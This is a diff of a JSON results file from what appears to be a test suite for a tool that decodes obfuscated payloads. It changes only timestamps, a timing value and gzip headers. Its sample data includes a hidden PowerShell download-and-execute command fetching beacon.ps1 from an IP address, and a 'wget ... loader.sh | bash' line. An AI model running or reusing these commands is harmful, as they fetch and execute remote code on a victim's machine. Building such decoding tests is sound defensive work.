@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-07-22T04:58:37Z",
+  "generated_at": "2026-07-27T06:42:48Z",
   "total": 12,
   "passed": 12,
   "pass_rate": 1.0,
@@ -18,7 +18,7 @@
       "engine": "?",
       "chain_len": 5,
       "downgrades": 0,
-      "http_ms": 0,
+      "http_ms": 1,
       "decoded_output": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
       "output_first_line": "powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://45.148.10.181/beacon.ps1\")",
       "layers": [
@@ -282,8 +282,8 @@
     {
       "sample_id": "S08_wget_b64_gzip",
       "wrap": "b64(gzip(P))",
-      "encoded_input": "H4sIALdKYGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
-      "encoded_input_preview": "H4sIALdKYGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input": "H4sIAM37ZmoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input_preview": "H4sIAM37ZmoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
       "input_len": 92,
       "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "expect_token": "wget",
